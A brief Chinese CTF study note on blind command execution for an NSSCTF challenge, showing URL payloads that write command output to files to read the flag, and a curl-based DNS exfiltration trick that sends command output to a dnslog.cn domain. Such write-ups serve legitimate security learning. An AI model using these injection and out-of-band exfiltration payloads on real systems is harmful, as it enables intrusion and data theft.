无回显RCE

[TOC]

[[SWPUCTF 2023 秋季新生赛\]RCE-PLUS | NSSCTF](https://www.nssctf.cn/problem/4502)

记录一下学习过程。
1，
直接写入，?cmd=ls / >1.txt
然后可以发现flag,
?cmd=cat /fl* >2.txt
拿到flag
2,
使用dnslog
http://www.dnslog.cn/
在这使用
?cmd=curl `命令`.域名
![NSSIMAGE](https://www.nssctf.cn/files/2023/12/2/c0181e2396.jpg)
在左边获取域名，执行完命令后点击右边，



###### 自增

[CTFSHOW每周大挑战——RCE篇_rce挑战1-CSDN博客](https://blog.csdn.net/qq_61955196/article/details/127932968?ops_request_misc=%7B%22request%5Fid%22%3A%22170571807016800184148811%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=170571807016800184148811&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-127932968-null-null.142^v99^pc_search_result_base1&utm_term=ctf RCE挑战4&spm=1018.2226.3001.4187)

https://blog.csdn.net/qaq517384/article/details/127976798?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170571702116800211587810%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=170571702116800211587810&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-127976798-null-null.142^v99^pc_search_result_base1&utm_term=ctf%20%E8%87%AA%E5%A2%9E%20%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6&spm=1018.2226.3001.4187

vscode中有脚本，zizeng.php